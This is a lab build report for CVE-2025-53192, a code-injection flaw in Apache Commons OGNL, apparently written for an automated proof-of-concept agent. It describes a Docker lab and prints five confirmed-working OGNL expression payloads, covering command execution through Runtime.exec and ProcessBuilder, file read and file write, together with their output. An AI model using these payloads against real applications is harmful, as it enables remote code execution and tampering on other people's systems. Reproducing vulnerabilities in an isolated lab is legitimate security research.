# Lab Build Report: CVE-2025-53192

## CVE ID
CVE-2025-53192

## Lab Architecture

**Type**: Single container (library-level vulnerability — no network services required)

Apache Commons OGNL is a Java library, not a server application. The vulnerability is in the expression evaluation API (`Ognl.getValue()`, `Ognl.setValue()`, `Ognl.parseExpression()`), which allows unrestricted class loading and method invocation. The lab provides a single container with the vulnerable library built from source and a pre-compiled PoC harness ready to execute.

### Container Topology

| Container | Image | Role | Networks |
|-----------|-------|------|----------|
| `cve-2025-53192-vulnerable` | `cve-2025-53192-vulnerable` (custom) | Built-from-source commons-ognl 4.0-SNAPSHOT + PoC harness | lab-net |

No supporting services (database, cache, etc.) are needed — the vulnerability is triggered by directly calling the OGNL API.

## Container Details

### `cve-2025-53192-vulnerable`

- **Base Image**: `eclipse-temurin:11-jdk` (runtime stage); `maven:3.9-eclipse-temurin-11` (build stage)
- **Java Version**: OpenJDK 11.0.30 (Temurin)
- **Container Name**: `cve-2025-53192-vulnerable`
- **Container IP**: Dynamic (use `docker inspect cve-2025-53192-vulnerable` to get current IP)
- **Ports**: None exposed (library-level vulnerability, no network services)
- **Volumes**: None
- **Working Directory**: `/lab`
- **CLASSPATH**: `/lab:/lab/commons-ognl.jar:/lab/javassist.jar`

### Files in Container (`/lab/`)

| File | Size | Description |
|------|------|-------------|
| `commons-ognl.jar` | 306 KB | Apache Commons OGNL 4.0-SNAPSHOT built from source |
| `javassist.jar` | 794 KB | Javassist 3.29.2-GA (runtime dependency for OGNL expression compiler) |
| `OgnlRCEHarness.java` | 8 KB | PoC harness source code |
| `OgnlRCEHarness.class` | 6 KB | Compiled PoC harness (ready to run) |

## Build System

- **Multi-stage Docker build**:
  1. **Stage 1** (`maven:3.9-eclipse-temurin-11`): Clones source, runs `mvn package -DskipTests -q -B`, extracts built JAR and Javassist dependency
  2. **Stage 2** (`eclipse-temurin:11-jdk`): Copies JARs, copies and compiles PoC harness
- **Build Command**: `mvn package -DskipTests -q -B`
- **Source Commit**: `003345d337f8ee824f79a24cc6cea4dfed66cf5d` (master HEAD — all versions are vulnerable)

## Build Status

| Component | Status | Notes |
|-----------|--------|-------|
| Maven build (commons-ognl-4.0-SNAPSHOT.jar) | **SUCCESS** | Built from source with JavaCC parser generation |
| Javassist dependency extraction | **SUCCESS** | Copied from Maven local repo |
| PoC harness compilation | **SUCCESS** | Compiled against commons-ognl.jar |
| Container startup | **SUCCESS** | Running with `tail -f /dev/null` (keeps alive for exec) |

No workarounds were needed. JDK 11 builds and runs the library cleanly.

## Start/Stop Commands

```bash
# Start lab
docker compose up -d

# Check status
docker compose ps

# Run PoC harness
docker exec cve-2025-53192-vulnerable java OgnlRCEHarness

# Run custom OGNL expressions (for PoC agent)
docker exec cve-2025-53192-vulnerable java -cp /lab:/lab/commons-ognl.jar:/lab/javassist.jar OgnlRCEHarness

# Get a shell inside the container
docker exec -it cve-2025-53192-vulnerable bash

# View logs
docker compose logs

# Stop lab
docker compose down
```

## Verification

All 5 attack vectors were tested and confirmed:

### Vector 1: Static Method Invocation — `@java.lang.Runtime@getRuntime().exec()`
```
Expression: @java.lang.Runtime@getRuntime().exec(new java.lang.String[]{"sh","-c","id"})
OUTPUT: uid=0(root) gid=0(root) groups=0(root)
[SUCCESS] RCE via Runtime.exec() confirmed!
```

### Vector 2: Constructor + Method Chain — `new ProcessBuilder(...).start()`
```
Expression: (new java.lang.ProcessBuilder(new java.lang.String[]{"sh","-c","whoami"})).start()
OUTPUT: root
[SUCCESS] RCE via ProcessBuilder confirmed!
```

### Vector 3: File System Read — `new Scanner(new File(...))`
```
Expression: new java.util.Scanner(new java.io.File("/etc/hostname")).useDelimiter("\\A").next()
OUTPUT: 4a9f22666f39
[SUCCESS] Arbitrary file read confirmed!
```

### Vector 4: File Write — `Runtime.exec("echo ... > /tmp/file")`
```
Expression: @java.lang.Runtime@getRuntime().exec(new java.lang.String[]{"sh","-c","echo CVE-2025-53192-RCE-CONFIRMED > /tmp/cve-2025-53192-pwned"})
File contents: CVE-2025-53192-RCE-CONFIRMED
[SUCCESS] Arbitrary file write confirmed!
```

### Vector 5: System Property Exfiltration
```
Expression: @java.lang.System@getProperty("java.version")
Java Version: 11.0.30
OS Name: Linux
[SUCCESS] System property exfiltration confirmed!
```

## Lab Files on Disk

```
.
├── docker-compose.yml          # Compose orchestration
├── Dockerfile.vulnerable       # Multi-stage build (Maven build + JDK runtime)
└── OgnlRCEHarness.java        # PoC harness source (5 attack vectors)
```

## Notes for PoC Agent

1. **No network services**: This is a library vulnerability. The PoC runs inside the container by calling the OGNL Java API directly. There is no HTTP endpoint or network service to attack.

2. **Pre-compiled harness**: The `OgnlRCEHarness.class` is ready to run. Execute with:
   ```bash
   docker exec cve-2025-53192-vulnerable java OgnlRCEHarness
   ```

3. **Custom expressions**: To test additional OGNL expressions, you can compile and run custom Java code inside the container. The classpath is set via the `CLASSPATH` environment variable.

4. **JDK 11 compatibility**: JDK 11 works without `--add-opens` flags. JDK 17+ would require `--add-opens java.base/java.lang=ALL-UNNAMED --add-opens java.base/java.util=ALL-UNNAMED`.

5. **No patched version**: The project is retired. There is no fix to compare against. All versions are vulnerable.

6. **OGNL API entry points**: `Ognl.getValue()`, `Ognl.setValue()`, `Ognl.parseExpression()` — any of these with user-controlled input leads to RCE.

## Known Issues

- **None**: The lab builds and runs cleanly on the first attempt. All attack vectors succeed.
